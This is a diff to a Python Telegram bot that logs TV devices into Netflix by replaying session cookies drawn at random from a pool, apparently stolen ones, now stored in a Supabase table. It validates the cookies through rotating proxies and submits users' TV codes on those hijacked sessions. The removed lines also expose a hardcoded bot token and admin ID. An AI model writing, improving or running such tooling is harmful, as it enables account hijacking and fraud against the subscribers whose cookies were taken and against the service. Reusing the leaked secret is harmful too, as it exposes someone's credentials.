@@ -1,42 +1,42 @@
-
+#!/usr/bin/env python3
+"""
+Netflix TV Code Auto-Login - Telegram Bot
+Fast, async, multi-user, with clean English responses.
+All bot messages are replies to user's messages.
+"""
 
 import asyncio
-import io
 import os
 import random
 import re
-import string
 import sys
 import urllib.parse
-import zipfile
 from datetime import datetime
 
 import requests
+import httpx
 from urllib3.exceptions import InsecureRequestWarning
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.constants import ParseMode
 
-# Load environment variables from .env file
-load_dotenv()
-
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
-# ══════════════════════════════════════════════════════════════════════
-#  CONFIG
-# ══════════════════════════════════════════════════════════════════════
+# ====================== ENVIRONMENT CONFIG ======================
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
 
-BOT_TOKEN = "8521325990:AAGF-_gZXLCFPr-1eTFxBN-7-3PZaBy8R6Y"
-ADMIN_IDS = [6177293322]  # Add your Telegram user ID here
+SUPABASE_URL = os.getenv("SUPABASE_URL")
+SUPABASE_KEY = os.getenv("SUPABASE_KEY")
 
-COOKIES_DIR = "vault"
+if not BOT_TOKEN or not SUPABASE_URL or not SUPABASE_KEY:
+    raise SystemExit("❌ Critical: Missing environment variables!")
+
+print(f"[*] Bot Token: {'✅ Loaded' if BOT_TOKEN else '❌ Missing'}")
+
 PROXY_FILE = "proxy.txt"
 REQUEST_TIMEOUT = 15
-USER_AGENT = (
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-    "AppleWebKit/537.36 (KHTML, like Gecko) "
-    "Chrome/124.0.0.0 Safari/537.36"
-)
+USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
 
 REQUIRED_COOKIES = ("NetflixId",)
 OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
@@ -55,6 +55,149 @@ stats = {
     "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
 }
 
+# ====================== FIXED FOR YOUR DATABASE ======================
+HEADERS = {
+    "apikey": SUPABASE_KEY,
+    "Authorization": f"Bearer {SUPABASE_KEY}",
+    "Content-Type": "application/json",
+    "Prefer": "return=minimal"
+}
+
+# ====================== BOT STATS PERSISTENCE (Supabase) ======================
+def load_bot_stats():
+    """Load stats from bot_stats table when bot starts"""
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/bot_stats?id=eq.1"
+        resp = httpx.get(url, headers=HEADERS, timeout=10)
+        
+        if resp.status_code == 200:
+            data = resp.json()
+            if data and len(data) > 0:
+                row = data[0]
+                stats["total_logins"] = row.get("total_logins", 0)
+                stats["successful"] = row.get("successful", 0)
+                stats["failed"] = row.get("failed", 0)
+                stats["codes_rejected"] = row.get("codes_rejected", 0)
+                
+                # Keep the original started_at from database if exists
+                if row.get("started_at"):
+                    stats["started_at"] = row["started_at"][:19].replace("T", " ")
+                
+                print(f"[DB Stats] ✅ Loaded from database | Total logins: {stats['total_logins']}")
+                return True
+    except Exception as e:
+        print(f"[DB Stats] Load error: {e}")
+    
+    print("[DB Stats] No existing stats found → starting fresh")
+    return False
+
+
+def save_bot_stats():
+    """Save current stats to bot_stats table (creates row if it doesn't exist)"""
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/bot_stats"
+        payload = {
+            "id": 1,
+            "total_logins": stats["total_logins"],
+            "successful": stats["successful"],
+            "failed": stats["failed"],
+            "codes_rejected": stats["codes_rejected"],
+            "updated_at": "now()"
+            # started_at is only set once by the database
+        }
+        
+        # Upsert = insert if not exists, update if exists
+        headers_upsert = {**HEADERS, "Prefer": "resolution=merge-duplicates"}
+        
+        resp = httpx.post(url, json=payload, headers=headers_upsert, timeout=10)
+        
+        if resp.status_code in (200, 201, 204):
+            print(f"[DB Stats] ✅ Saved | Total: {stats['total_logins']} | Success: {stats['successful']}")
+            return True
+        else:
+            print(f"[DB Stats] ⚠️ Save failed: {resp.status_code}")
+            return False
+    except Exception as e:
+        print(f"[DB Stats] Save error: {e}")
+        return False
+
+def count_vault_cookies():
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/vamt_keys"
+        params = {
+            "status": "eq.active",
+            "service_type": "ilike.*Netflix*"
+        }
+        resp = httpx.get(
+            url, 
+            headers={**HEADERS, "Prefer": "count=exact"}, 
+            params=params, 
+            timeout=15
+        )
+        
+        if resp.status_code == 200:
+            count_str = resp.headers.get("content-range", "0-0/0").split("/")[-1]
+            count = int(count_str) if count_str.isdigit() else 0
+            print(f"[DB] ✅ Found {count} active Netflix cookies")
+            return count
+        else:
+            print(f"[DB] Count failed: {resp.status_code}")
+            return 0
+    except Exception as e:
+        print(f"[DB] Count error: {e}")
+        return 0
+
+def get_random_cookie_file():
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/vamt_keys"
+        params = {
+            "status": "eq.active",
+            "service_type": "ilike.*Netflix*",
+            "limit": "50"
+        }
+        resp = httpx.get(url, headers=HEADERS, params=params, timeout=15)
+        
+        if resp.status_code != 200:
+            print(f"[DB] Fetch failed: {resp.status_code}")
+            return None, None
+
+        data = resp.json()
+        print(f"[DB] Rows returned: {len(data)}")
+
+        if not data:
+            print("[DB] ❌ No active cookies found")
+            return None, None
+
+        row = random.choice(data)
+        key_id = row.get("key_id", "")
+
+        # Get raw content
+        raw_content = row.get("cookie_data") or key_id
+        content = raw_content.strip() if raw_content else ""
+
+        print(f"[DB] Selected cookie | Length: {len(content)} | Starts with: {content[:80]}...")
+
+        if len(content) < 100:
+            print("[DB] ⚠️ Cookie too small - might be invalid")
+
+        # Consume 1 use
+        new_remaining = max(0, int(row.get("remaining") or 1) - 1)
+        
+        # ✅ URL-safe key_id — strip any stray whitespace/tabs
+        safe_key_id = key_id.strip().replace("\t", "").replace("\n", "")
+        update_url = f"{SUPABASE_URL}/rest/v1/vamt_keys?key_id=eq.{safe_key_id}"
+
+        update_data = {"remaining": new_remaining, "last_updated": "now()"}
+        if new_remaining == 0:
+            update_data["status"] = "inactive"
+
+        httpx.patch(update_url, json=update_data, headers=HEADERS, timeout=10)
+
+        return key_id, content
+
+    except Exception as e:
+        print(f"[DB] Get cookie error: {e}")
+        return None, None
 
 # ══════════════════════════════════════════════════════════════════════
 #  PROXY
@@ -123,33 +266,8 @@ proxies_list = load_proxies()
 def canonicalize_name(name):
     return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())
 
-
 def is_netflix_cookie(domain, name):
     return canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()
-
-
-def extract_netscape_entries(raw_text):
-    entries = []
-    for line in raw_text.splitlines():
-        if line.startswith("#HttpOnly_"):
-            line = line[len("#HttpOnly_"):]
-        parts = line.split("\t")
-        if len(parts) < 7:
-            parts = re.split(r"\s+", line, maxsplit=6)
-        if len(parts) < 7:
-            continue
-        if parts[1].upper() not in ("TRUE", "FALSE"):
-            continue
-        if parts[3].upper() not in ("TRUE", "FALSE"):
-            continue
-        if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
-            continue
-        name = canonicalize_name(parts[5])
-        if not is_netflix_cookie(parts[0], name):
-            continue
-        entries.append({"name": name, "value": parts[6]})
-    return entries
-
 
 def extract_json_entries(content):
     try:
@@ -186,20 +304,65 @@ def extract_raw_entries(raw_text):
         entries.append({"name": name, "value": value})
     return entries
 
-
 def extract_cookie_dict(content):
-    for extractor in (extract_json_entries, extract_netscape_entries, extract_raw_entries):
-        entries = extractor(content)
-        if entries:
-            break
-    else:
+    """Improved extractor for your Netscape cookie format"""
+    if not content or len(content) < 50:
         return None
+
+    # Try Netscape format first (your main format)
+    entries = extract_netscape_entries(content)
+    if not entries:
+        entries = extract_raw_entries(content)
+    if not entries:
+        entries = extract_json_entries(content)
+
+    if not entries:
+        return None
+
     cookies = {}
     for e in entries:
         if e["name"] not in cookies:
             cookies[e["name"]] = e["value"]
+
+    # Debug
+    if "NetflixId" in cookies:
+        print(f"[COOKIE] ✅ Extracted NetflixId successfully (length: {len(cookies['NetflixId'])})")
+    else:
+        print(f"[COOKIE] ⚠️ No NetflixId found in cookie")
+
     return cookies if "NetflixId" in cookies else None
 
+def clean_cookie_content(content):
+    """Strip only leading/trailing whitespace — preserve internal tabs."""
+    if not content:
+        return content
+    return content.strip()
+
+def extract_netscape_entries(raw_text):
+    entries = []
+    for line in raw_text.splitlines():
+        line = line.strip()
+        if not line or line.startswith('#'):
+            continue
+        if line.startswith("#HttpOnly_"):
+            line = line[10:]
+
+        # Tab-separated Netscape format
+        parts = line.split('\t')
+        
+        if len(parts) < 7:
+            continue
+
+        domain = parts[0]
+        name = canonicalize_name(parts[5])
+        value = parts[6].strip()
+
+        if not is_netflix_cookie(domain, name):
+            continue
+
+        entries.append({"name": name, "value": value})
+
+    return entries
 
 # ══════════════════════════════════════════════════════════════════════
 #  COOKIE VALIDATION
@@ -423,36 +586,6 @@ def submit_tv_code(session, tv_code, proxy=None):
 
 
 # ══════════════════════════════════════════════════════════════════════
-#  COOKIE VAULT MANAGEMENT
-# ══════════════════════════════════════════════════════════════════════
-
-def get_vault_cookies():
-    if not os.path.exists(COOKIES_DIR):
-        return []
-    return [f for f in os.listdir(COOKIES_DIR) if f.lower().endswith((".txt", ".json"))]
-
-
-def get_random_cookie_file():
-    with cookie_lock:
-        files = get_vault_cookies()
-        if not files:
-            return None, None
-        filename = random.choice(files)
-        filepath = os.path.join(COOKIES_DIR, filename)
-        try:
-            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
-                content = f.read()
-            os.remove(filepath)
-            return filename, content
-        except:
-            return None, None
-
-
-def count_vault_cookies():
-    return len(get_vault_cookies())
-
-
-# ══════════════════════════════════════════════════════════════════════
 #  ANIMATION
 # ══════════════════════════════════════════════════════════════════════
 
@@ -476,14 +609,14 @@ async def animate_message(context: ContextTypes.DEFAULT_TYPE, chat_id: int, mess
         frame_idx += 1
         await asyncio.sleep(0.3)
 
-
 # ══════════════════════════════════════════════════════════════════════
 #  BOT COMMANDS
 # ══════════════════════════════════════════════════════════════════════
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Welcome message - replied to user's message."""
     user = update.effective_user
+    if user.id not in ADMIN_IDS:
+        return
+    
     vault_count = count_vault_cookies()
     await update.message.reply_text(
         f"👋 <b>Hey {user.first_name}!</b>\n\n"
@@ -495,10 +628,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_to_message_id=update.message.message_id,
     )
 
-
 async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /tv {code} command - replied to user's message."""
-    user = update.effective_user
+    user_id = update.effective_user.id
+    if user_id not in ADMIN_IDS:
+        return  # silently ignore
+
     chat_id = update.effective_chat.id
     message_id = update.message.message_id
 
@@ -553,6 +688,7 @@ async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         with stats_lock:
             stats["total_logins"] += 1
             stats["successful"] += 1
+        save_bot_stats()
         response = (
             f"✅ <b>TV ACTIVATED SUCCESSFULLY!</b>\n\n"
             f"📺 Your Code: <code>{tv_code}</code>\n"
@@ -564,16 +700,19 @@ async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         with stats_lock:
             stats["total_logins"] += 1
             stats["failed"] += 1
+        save_bot_stats()
         response = "😔 <b>All cookies exhausted!</b>\n\nNo working cookies left in vault.\nWait for admin to upload more."
     elif result.get("error") == "all_dead":
         with stats_lock:
             stats["total_logins"] += 1
             stats["failed"] += 1
+        save_bot_stats()
         response = "❌ <b>No working cookies found!</b>\n\nAll available cookies are dead.\nVault is now empty."
     elif result.get("error") == "Invalid or expired TV code":
         with stats_lock:
             stats["total_logins"] += 1
             stats["codes_rejected"] += 1
+        save_bot_stats()
         response = (
             f"❌ <b>Invalid or Expired TV Code</b>\n\n"
             f"📺 Code: <code>{tv_code}</code>\n"
@@ -585,6 +724,7 @@ async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         with stats_lock:
             stats["total_logins"] += 1
             stats["codes_rejected"] += 1
+        save_bot_stats()
         response = (
             f"❌ <b>Activation Failed</b>\n\n"
             f"📺 Code: <code>{tv_code}</code>\n"
@@ -594,7 +734,6 @@ async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     await status_msg.edit_text(response, parse_mode=ParseMode.HTML)
-
 
 def process_tv_login(tv_code):
     """Process TV login - runs in thread."""
@@ -611,15 +750,16 @@ def process_tv_login(tv_code):
 
         cookies = extract_cookie_dict(content)
         if not cookies:
+            print(f"[COOKIE] Skipping bad cookie")
             continue
 
         proxy = random.choice(proxies) if proxies else None
         valid, country, plan = validate_cookie(cookies, proxy)
 
         if not valid:
+            print(f"[COOKIE] Invalid cookie: {filename}")
             continue
 
-        # Found valid cookie - try TV activation
         session = requests.Session()
         session.cookies.update(cookies)
         result = submit_tv_code(session, tv_code, proxy)
@@ -632,105 +772,11 @@ def process_tv_login(tv_code):
 
     return {"success": False, "error": "all_dead"}
 
-
-async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /upload - admin only."""
-    user_id = update.effective_user.id
-    message_id = update.message.message_id
-
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text(
-            "🚫 <b>Admin only!</b>",
-            parse_mode=ParseMode.HTML,
-            reply_to_message_id=message_id,
-        )
-        return
-
-    if not update.message.reply_to_message or not update.message.reply_to_message.document:
-        await update.message.reply_text(
-            "📎 <b>Usage:</b> Reply to a ZIP file with <code>/upload</code>\n\n"
-            "ZIP should contain .txt or .json cookie files.",
-            parse_mode=ParseMode.HTML,
-            reply_to_message_id=message_id,
-        )
-        return
-
-    doc = update.message.reply_to_message.document
-    if not doc.file_name.lower().endswith('.zip'):
-        await update.message.reply_text(
-            "❌ Only <b>.zip</b> files are accepted!",
-            parse_mode=ParseMode.HTML,
-            reply_to_message_id=message_id,
-        )
-        return
-
-    status_msg = await update.message.reply_text(
-        "📥 <b>Downloading...</b>",
-        parse_mode=ParseMode.HTML,
-        reply_to_message_id=message_id,
-    )
-
-    try:
-        file = await context.bot.get_file(doc.file_id)
-        zip_bytes = await file.download_as_bytearray()
-
-        await status_msg.edit_text("📂 <b>Extracting...</b>", parse_mode=ParseMode.HTML)
-
-        os.makedirs(COOKIES_DIR, exist_ok=True)
-        added = 0
-        skipped = 0
-
-        with zipfile.ZipFile(io.BytesIO(zip_bytes), 'r') as zf:
-            for name in zf.namelist():
-                if name.endswith('/') or name.startswith('__MACOSX') or name.startswith('.'):
-                    continue
-                if not name.lower().endswith(('.txt', '.json')):
-                    skipped += 1
-                    continue
-                try:
-                    content = zf.read(name).decode('utf-8', errors='ignore')
-                    cookies = extract_cookie_dict(content)
-                    if not cookies:
-                        skipped += 1
-                        continue
-                    base = os.path.basename(name)
-                    safe_name = re.sub(r'[<>:"/\\|?*]', '_', base)
-                    dest = os.path.join(COOKIES_DIR, safe_name)
-                    if os.path.exists(dest):
-                        suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
-                        name_part, ext = os.path.splitext(safe_name)
-                        dest = os.path.join(COOKIES_DIR, f"{name_part}_{suffix}{ext}")
-                    with open(dest, 'w', encoding='utf-8') as f:
-                        f.write(content)
-                    added += 1
-                except:
-                    skipped += 1
-
-        vault_count = count_vault_cookies()
-        await status_msg.edit_text(
-            f"✅ <b>Upload complete!</b>\n\n"
-            f"📥 Added: <b>{added}</b> cookies\n"
-            f"⏭️ Skipped: <b>{skipped}</b>\n"
-            f"🍪 Total in vault: <b>{vault_count}</b>",
-            parse_mode=ParseMode.HTML,
-        )
-
-    except Exception as e:
-        await status_msg.edit_text(f"❌ <b>Error:</b> {str(e)}", parse_mode=ParseMode.HTML)
-
-
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /stats - admin only."""
     user_id = update.effective_user.id
-    message_id = update.message.message_id
-
     if user_id not in ADMIN_IDS:
-        await update.message.reply_text(
-            "🚫 <b>Admin only!</b>",
-            parse_mode=ParseMode.HTML,
-            reply_to_message_id=message_id,
-        )
-        return
+        return  # silently ignore
+    message_id = update.message.message_id
 
     vault_count = count_vault_cookies()
 
@@ -751,35 +797,36 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_to_message_id=message_id,
     )
 
-
 # ══════════════════════════════════════════════════════════════════════
 #  MAIN
 # ══════════════════════════════════════════════════════════════════════
 
 def main():
     print("=" * 50)
-    print("  Netflix TV Login Bot")
+    print("  Netflix TV Login Bot (Fixed)")
     print("=" * 50)
-    print()
-
-    os.makedirs(COOKIES_DIR, exist_ok=True)
 
     vault_count = count_vault_cookies()
-    print(f"[*] Cookies in vault: {vault_count}")
+    print(f"[*] Cookies in Supabase: {vault_count}")
     print(f"[*] Proxies loaded: {len(proxies_list)}")
-    print(f"[*] Admin IDs: {ADMIN_IDS}")
-    print()
+
+    # Load persistent stats from Supabase
+    load_bot_stats()
+    
+    # If this is the very first run, create the row
+    if stats["total_logins"] == 0 and stats["successful"] == 0:
+        save_bot_stats()
+    
+    print(f"[*] Bot stats loaded - Total logins so far: {stats['total_logins']}")
 
     app = Application.builder().token(BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("tv", tv_command))
-    app.add_handler(CommandHandler("upload", upload_command))
     app.add_handler(CommandHandler("stats", stats_command))
 
-    print("[*] Bot started! Press Ctrl+C to stop.")
+    print("[*] Bot started!")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
-
 
 if __name__ == "__main__":
     try:
